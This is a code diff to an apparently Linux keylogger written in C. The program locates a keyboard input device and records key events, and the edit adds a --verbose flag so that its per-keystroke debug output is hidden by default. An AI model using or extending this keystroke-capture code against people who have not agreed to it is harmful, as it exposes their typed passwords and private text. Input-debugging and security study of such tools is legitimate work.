@@ -17,12 +17,28 @@
 #include <signal.h>
 #include <linux/input.h>
 #include <time.h>
+#include <stdarg.h>
 
 #include "constants.h"
 #include "keymap.h"
 
 #define SUCCESS 1
 #define FAILURE 0
+
+static int VERBOSE = 0;
+
+// Only prints to stdout when --verbose was passed; errors always go to
+// stderr via fprintf regardless of this flag.
+void verbosePrintf(const char *fmt, ...) {
+  if (!VERBOSE) {
+    return;
+  }
+
+  va_list args;
+  va_start(args, fmt);
+  vprintf(fmt, args);
+  va_end(args);
+}
 
 int hasEventTypes(int fd, unsigned long evbit_to_check) {
   unsigned long evbit = 0;
@@ -32,7 +48,7 @@ int hasEventTypes(int fd, unsigned long evbit_to_check) {
     return FAILURE;
   }
 
-  printf("hasEventTypes: evbit=%#lb evbit_to_check=%#lb\n",
+  verbosePrintf("hasEventTypes: evbit=%#lb evbit_to_check=%#lb\n",
          evbit, evbit_to_check);
 
   return ((evbit & evbit_to_check) == evbit_to_check);
@@ -47,7 +63,7 @@ int hasAbsoluteMovement(int fd) {
 }
 
 int hasKeys(int fd) {
-  printf("hasKeys, EV_KEY=%#b\n", EV_KEY);
+  verbosePrintf("hasKeys, EV_KEY=%#b\n", EV_KEY);
   return hasEventTypes(fd, (1 << EV_KEY));
 }
 
@@ -176,7 +192,7 @@ KeyboardDevice* findKeyboardDevice(char *path) {
                 filepath, strerror(errno));
         return FAILURE;
       }
-      printf("findKeyboardDevice: opened fd:%d; file:%s\n", fd, filepath);
+      verbosePrintf("findKeyboardDevice: opened fd:%d; file:%s\n", fd, filepath);
       int keys_to_check[] = {KEY_Q, KEY_W, KEY_E, KEY_R, KEY_T, KEY_Y, KEY_BACKSPACE, KEY_ENTER, KEY_0, KEY_1, KEY_2, KEY_ESC};
       if (!hasRelativeMovement(fd)
           && !hasAbsoluteMovement(fd)
@@ -189,7 +205,7 @@ KeyboardDevice* findKeyboardDevice(char *path) {
         }
         kbd->fd = fd;
         snprintf(kbd->path, PATH_MAX, "%s", filepath);
-        printf("findKeyboardDevice: FOUND: fd=%d; path=%s\n", kbd->fd, kbd->path);
+        verbosePrintf("findKeyboardDevice: FOUND: fd=%d; path=%s\n", kbd->fd, kbd->path);
         return kbd;
       }
       if (close(fd) == -1) {
@@ -340,7 +356,7 @@ int startKeylogger(KeyboardDevice *kbd, FILE *output) {
 
   while (!STOP_KEYLOGGER) {
     errno = 0;
-    printf("%s|startKeylogger: calling select to wait for input fd=%d; path=%s\n", currtime(), kbd->fd, kbd->path);
+    verbosePrintf("%s|startKeylogger: calling select to wait for input fd=%d; path=%s\n", currtime(), kbd->fd, kbd->path);
 
     fd_set read_fds;
     FD_ZERO(&read_fds);
@@ -358,12 +374,12 @@ int startKeylogger(KeyboardDevice *kbd, FILE *output) {
     }
 
     if (select_result == 0) { // nothing to read (timed out)
-      printf("%s|startKeylogger: nothing to read (maybe timed out, errno=%d)\n", currtime(), errno);
+      verbosePrintf("%s|startKeylogger: nothing to read (maybe timed out, errno=%d)\n", currtime(), errno);
       continue;
     }
 
     if (!FD_ISSET(kbd->fd, &read_fds)) {
-      printf("startKeylogger: keyboard fd was not ready (e%s rrno=%d)\n", currtime(), errno);
+      verbosePrintf("startKeylogger: keyboard fd was not ready (e%s rrno=%d)\n", currtime(), errno);
       continue;
     }
 
@@ -371,7 +387,7 @@ int startKeylogger(KeyboardDevice *kbd, FILE *output) {
 
     ssize_t bytesRead = read(kbd->fd, kbd_events, event_size*MAX_EVENTS);
     if (bytesRead < 0 && errno == EAGAIN) {
-      printf("startKeylogger: no bytes rea (E%s AGAIN)\n", currtime());
+      verbosePrintf("startKeylogger: no bytes rea (E%s AGAIN)\n", currtime());
       continue;
     }
 
@@ -386,7 +402,7 @@ int startKeylogger(KeyboardDevice *kbd, FILE *output) {
     }
 
     ssize_t numEventsRead = bytesRead / event_size;
-    printf("%s|startKeylogger: read %ld events\n", currtime(), numEventsRead);
+    verbosePrintf("%s|startKeylogger: read %ld events\n", currtime(), numEventsRead);
 
     for (ssize_t ii = 0; ii < numEventsRead; ++ii) {
       if (kbd_events[ii].type == EV_KEY) {
@@ -405,7 +421,7 @@ int startKeylogger(KeyboardDevice *kbd, FILE *output) {
           snprintf(quoted_key, sizeof(quoted_key), "'%c'", ch);
         }
 
-        printf("%s|read key: code=%s (%d); value=%s (%d); type=%s (%d); modifiers=%s; key=%s\n", ts,
+        verbosePrintf("%s|read key: code=%s (%d); value=%s (%d); type=%s (%d); modifiers=%s; key=%s\n", ts,
                code_name,
                kbd_events[ii].code,
                value_name != NULL ? value_name : "?",
@@ -483,7 +499,13 @@ int main (int argc, char **argv) {
   defer(FreeString) char *event_file = NULL;
   defer(FreeString) char *output_file = NULL;
   for (int ii = 0; ii < argc; ++ii) {
-    printf("%s|main: argv[%02d]=%s\n", currtime(), ii, argv[ii]);
+    if (0 == strcmp(argv[ii], "--verbose")) {
+      VERBOSE = 1;
+    }
+  }
+
+  for (int ii = 0; ii < argc; ++ii) {
+    verbosePrintf("%s|main: argv[%02d]=%s\n", currtime(), ii, argv[ii]);
     if (0 == strncmp(argv[ii], "--file=", strlen("--file="))) {
       char *start = argv[ii] + strlen("--file=");
       if (*start == '\0') {
@@ -516,7 +538,7 @@ int main (int argc, char **argv) {
     fprintf(stderr, "%s|main: unable to obtain keyboard\n", currtime());
     return FAILURE;
   }
-  printf("%s|main: keyboard at: fd=%d, path=%s\n", currtime(), kbd->fd, kbd->path);
+  verbosePrintf("%s|main: keyboard at: fd=%d, path=%s\n", currtime(), kbd->fd, kbd->path);
 
   defer(CloseFile) FILE *output = NULL;
   if (output_file != NULL) {
